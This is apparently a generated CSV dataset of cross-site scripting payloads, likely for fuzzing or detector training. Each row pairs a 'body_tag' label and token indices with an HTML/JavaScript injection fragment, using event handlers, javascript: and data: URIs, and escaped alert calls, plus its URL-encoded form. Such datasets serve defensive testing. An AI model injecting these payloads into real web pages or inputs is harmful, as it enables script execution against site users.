body_tag,"[18, 52, 48, 4, 41]","<iframe javascript:\u0061lert();onerror=javascript:alert();<script src=""data:text/html,",%3Ciframe%20javascript%3A%5Cu0061lert%28%29%3Bonerror%3Djavascript%3Aalert%28%29%3B%3Cscript%20src%3D%22data%3Atext/html%2C
body_tag,"[16, 35, 2, 13, 57]",<input <embed <video><source </img>onerror=alert();,%3Cinput%20%3Cembed%20%3Cvideo%3E%3Csource%20%3C/img%3Eonerror%3Dalert%28%29%3B
body_tag,"[6, 41, 52, 41, 8]","<a src=""data:text/html,javascript:\u0061lert();src=""data:text/html,</a>",%3Ca%20src%3D%22data%3Atext/html%2Cjavascript%3A%5Cu0061lert%28%29%3Bsrc%3D%22data%3Atext/html%2C%3C/a%3E
body_tag,"[74, 70, 3, 67, 12]"," ""<video><source/><img/",%20%22%3Cvideo%3E%3Csource/%3E%3Cimg/
body_tag,"[7, 12, 27, 65, 57]",<a/<img/<object/confirm(1);onerror=alert();,%3Ca/%3Cimg/%3Cobject/confirm%281%29%3Bonerror%3Dalert%28%29%3B
body_tag,"[38, 18, 5, 30, 26]",src=x <iframe <script/<select/<object ,src%3Dx%20%3Ciframe%20%3Cscript/%3Cselect/%3Cobject%20
body_tag,"[65, 39, 6, 13, 0]",confirm(1);src=/ <a </img><script>,confirm%281%29%3Bsrc%3D/%20%3Ca%20%3C/img%3E%3Cscript%3E
body_tag,"[12, 65, 4, 73, 1]",<img/confirm(1);<script /</script>,%3Cimg/confirm%281%29%3B%3Cscript%20/%3C/script%3E
body_tag,"[61, 15, 37, 42, 57]",al\u0065rt();<body/</embed>src=saivs.js onerror=alert();,al%5Cu0065rt%28%29%3B%3Cbody/%3C/embed%3Esrc%3Dsaivs.js%20onerror%3Dalert%28%29%3B
body_tag,"[58, 33, 42, 67, 0]",saivs.js <canvas/src=saivs.js ><script>,saivs.js%20%3Ccanvas/src%3Dsaivs.js%20%3E%3Cscript%3E
body_tag,"[1, 8, 56, 45, 49]",</script></a>onmouseover=alert();data=saivs.html onerror=\u0061lert();,%3C/script%3E%3C/a%3Eonmouseover%3Dalert%28%29%3Bdata%3Dsaivs.html%20onerror%3D%5Cu0061lert%28%29%3B
body_tag,"[42, 24, 65, 9, 56]",src=saivs.js <svg confirm(1);<option onmouseover=alert();,src%3Dsaivs.js%20%3Csvg%20confirm%281%29%3B%3Coption%20onmouseover%3Dalert%28%29%3B
body_tag,"[51, 23, 70, 19, 11]","javascript:alert();</frameset>""<iframe/<img ",javascript%3Aalert%28%29%3B%3C/frameset%3E%22%3Ciframe/%3Cimg%20
body_tag,"[8, 3, 42, 53, 65]",</a><video><source/src=saivs.js javascript:al\u0065rt();confirm(1);,%3C/a%3E%3Cvideo%3E%3Csource/src%3Dsaivs.js%20javascript%3Aal%5Cu0065rt%28%29%3Bconfirm%281%29%3B
body_tag,"[47, 49, 1, 59, 4]",data=onerror=\u0061lert();</script>alert();<script ,data%3Donerror%3D%5Cu0061lert%28%29%3B%3C/script%3Ealert%28%29%3B%3Cscript%20
body_tag,"[2, 51, 1, 71, 22]",<video><source javascript:alert();</script>'<frameset><frame/,%3Cvideo%3E%3Csource%20javascript%3Aalert%28%29%3B%3C/script%3E%27%3Cframeset%3E%3Cframe/
body_tag,"[54, 64, 32, 28, 51]",onload=alert();al\u0065rt``;<canvas </object>javascript:alert();,onload%3Dalert%28%29%3Bal%5Cu0065rt%60%60%3B%3Ccanvas%20%3C/object%3Ejavascript%3Aalert%28%29%3B
body_tag,"[22, 55, 54, 2, 19]","<frameset><frame/onload=alert();""onload=alert();<video><source <iframe/",%3Cframeset%3E%3Cframe/onload%3Dalert%28%29%3B%22onload%3Dalert%28%29%3B%3Cvideo%3E%3Csource%20%3Ciframe/
body_tag,"[0, 51, 38, 46, 67]","<script>javascript:alert();src=x data=""data:text/html,>",%3Cscript%3Ejavascript%3Aalert%28%29%3Bsrc%3Dx%20data%3D%22data%3Atext/html%2C%3E
body_tag,"[32, 14, 31, 24, 9]",<canvas <body </select><svg <option ,%3Ccanvas%20%3Cbody%20%3C/select%3E%3Csvg%20%3Coption%20
body_tag,"[64, 39, 42, 2, 57]",al\u0065rt``;src=/ src=saivs.js <video><source onerror=alert();,al%5Cu0065rt%60%60%3Bsrc%3D/%20src%3Dsaivs.js%20%3Cvideo%3E%3Csource%20onerror%3Dalert%28%29%3B
body_tag,"[7, 9, 65, 46, 60]","<a/<option confirm(1);data=""data:text/html,\u0061lert();",%3Ca/%3Coption%20confirm%281%29%3Bdata%3D%22data%3Atext/html%2C%5Cu0061lert%28%29%3B
body_tag,"[50, 27, 27, 72, 14]",onerror=al\u0065rt();<object/<object/#<body ,onerror%3Dal%5Cu0065rt%28%29%3B%3Cobject/%3Cobject/%23%3Cbody%20
body_tag,"[56, 34, 30, 56, 48]",onmouseover=alert();</canvas><select/onmouseover=alert();onerror=javascript:alert();,onmouseover%3Dalert%28%29%3B%3C/canvas%3E%3Cselect/onmouseover%3Dalert%28%29%3Bonerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[46, 20, 48, 30, 49]","data=""data:text/html,</iframe>onerror=javascript:alert();<select/onerror=\u0061lert();",data%3D%22data%3Atext/html%2C%3C/iframe%3Eonerror%3Djavascript%3Aalert%28%29%3B%3Cselect/onerror%3D%5Cu0061lert%28%29%3B
body_tag,"[20, 35, 54, 70, 33]","</iframe><embed onload=alert();""<canvas/",%3C/iframe%3E%3Cembed%20onload%3Dalert%28%29%3B%22%3Ccanvas/
body_tag,"[19, 30, 23, 6, 56]",<iframe/<select/</frameset><a onmouseover=alert();,%3Ciframe/%3Cselect/%3C/frameset%3E%3Ca%20onmouseover%3Dalert%28%29%3B
body_tag,"[7, 51, 67, 5, 1]",<a/javascript:alert();><script/</script>,%3Ca/javascript%3Aalert%28%29%3B%3E%3Cscript/%3C/script%3E
body_tag,"[18, 20, 51, 7, 36]",<iframe </iframe>javascript:alert();<a/<embed/,%3Ciframe%20%3C/iframe%3Ejavascript%3Aalert%28%29%3B%3Ca/%3Cembed/
body_tag,"[46, 66, 3, 6, 61]","data=""data:text/html,prompt(1);<video><source/<a al\u0065rt();",data%3D%22data%3Atext/html%2Cprompt%281%29%3B%3Cvideo%3E%3Csource/%3Ca%20al%5Cu0065rt%28%29%3B
body_tag,"[9, 29, 53, 58, 69]",<option <select javascript:al\u0065rt();saivs.js <,%3Coption%20%3Cselect%20javascript%3Aal%5Cu0065rt%28%29%3Bsaivs.js%20%3C
body_tag,"[11, 23, 55, 5, 71]","<img </frameset>onload=alert();""<script/'",%3Cimg%20%3C/frameset%3Eonload%3Dalert%28%29%3B%22%3Cscript/%27
body_tag,"[67, 15, 68, 63, 38]",><body/ />\u0061lert``;src=x ,%3E%3Cbody/%20/%3E%5Cu0061lert%60%60%3Bsrc%3Dx%20
body_tag,"[57, 43, 3, 2, 26]","onerror=alert();type=""image"" <video><source/<video><source <object ",onerror%3Dalert%28%29%3Btype%3D%22image%22%20%3Cvideo%3E%3Csource/%3Cvideo%3E%3Csource%20%3Cobject%20
body_tag,"[2, 61, 36, 41, 8]","<video><source al\u0065rt();<embed/src=""data:text/html,</a>",%3Cvideo%3E%3Csource%20al%5Cu0065rt%28%29%3B%3Cembed/src%3D%22data%3Atext/html%2C%3C/a%3E
body_tag,"[37, 60, 25, 46, 10]","</embed>\u0061lert();<svg/data=""data:text/html,<option/",%3C/embed%3E%5Cu0061lert%28%29%3B%3Csvg/data%3D%22data%3Atext/html%2C%3Coption/
body_tag,"[4, 21, 50, 21, 12]",<script <frameset><frame onerror=al\u0065rt();<frameset><frame <img/,%3Cscript%20%3Cframeset%3E%3Cframe%20onerror%3Dal%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe%20%3Cimg/
body_tag,"[64, 4, 39, 15, 57]",al\u0065rt``;<script src=/ <body/onerror=alert();,al%5Cu0065rt%60%60%3B%3Cscript%20src%3D/%20%3Cbody/onerror%3Dalert%28%29%3B
body_tag,"[7, 41, 42, 26, 7]","<a/src=""data:text/html,src=saivs.js <object <a/",%3Ca/src%3D%22data%3Atext/html%2Csrc%3Dsaivs.js%20%3Cobject%20%3Ca/
body_tag,"[69, 65, 7, 7, 67]",<confirm(1);<a/<a/>,%3Cconfirm%281%29%3B%3Ca/%3Ca/%3E
body_tag,"[73, 43, 48, 28, 37]","/type=""image"" onerror=javascript:alert();</object></embed>",/type%3D%22image%22%20onerror%3Djavascript%3Aalert%28%29%3B%3C/object%3E%3C/embed%3E
body_tag,"[47, 18, 67, 16, 9]",data=<iframe ><input <option ,data%3D%3Ciframe%20%3E%3Cinput%20%3Coption%20
body_tag,"[43, 66, 28, 44, 18]","type=""image"" prompt(1);</object>type=""text/x-scriptlet"" <iframe ",type%3D%22image%22%20prompt%281%29%3B%3C/object%3Etype%3D%22text/x-scriptlet%22%20%3Ciframe%20
body_tag,"[32, 27, 3, 53, 21]",<canvas <object/<video><source/javascript:al\u0065rt();<frameset><frame ,%3Ccanvas%20%3Cobject/%3Cvideo%3E%3Csource/javascript%3Aal%5Cu0065rt%28%29%3B%3Cframeset%3E%3Cframe%20
body_tag,"[4, 3, 36, 44, 70]","<script <video><source/<embed/type=""text/x-scriptlet"" """,%3Cscript%20%3Cvideo%3E%3Csource/%3Cembed/type%3D%22text/x-scriptlet%22%20%22
body_tag,"[41, 35, 71, 32, 48]","src=""data:text/html,<embed '<canvas onerror=javascript:alert();",src%3D%22data%3Atext/html%2C%3Cembed%20%27%3Ccanvas%20onerror%3Djavascript%3Aalert%28%29%3B
body_tag,"[49, 50, 70, 15, 39]","onerror=\u0061lert();onerror=al\u0065rt();""<body/src=/ ",onerror%3D%5Cu0061lert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B%22%3Cbody/src%3D/%20
body_tag,"[74, 21, 35, 62, 17]", <frameset><frame <embed alert``;<input/,%20%3Cframeset%3E%3Cframe%20%3Cembed%20alert%60%60%3B%3Cinput/
body_tag,"[22, 18, 36, 66, 60]",<frameset><frame/<iframe <embed/prompt(1);\u0061lert();,%3Cframeset%3E%3Cframe/%3Ciframe%20%3Cembed/prompt%281%29%3B%5Cu0061lert%28%29%3B
body_tag,"[73, 67, 2, 32, 44]","/><video><source <canvas type=""text/x-scriptlet"" ",/%3E%3Cvideo%3E%3Csource%20%3Ccanvas%20type%3D%22text/x-scriptlet%22%20
body_tag,"[53, 25, 63, 12, 58]",javascript:al\u0065rt();<svg/\u0061lert``;<img/saivs.js ,javascript%3Aal%5Cu0065rt%28%29%3B%3Csvg/%5Cu0061lert%60%60%3B%3Cimg/saivs.js%20
body_tag,"[52, 50, 12, 9, 65]",javascript:\u0061lert();onerror=al\u0065rt();<img/<option confirm(1);,javascript%3A%5Cu0061lert%28%29%3Bonerror%3Dal%5Cu0065rt%28%29%3B%3Cimg/%3Coption%20confirm%281%29%3B
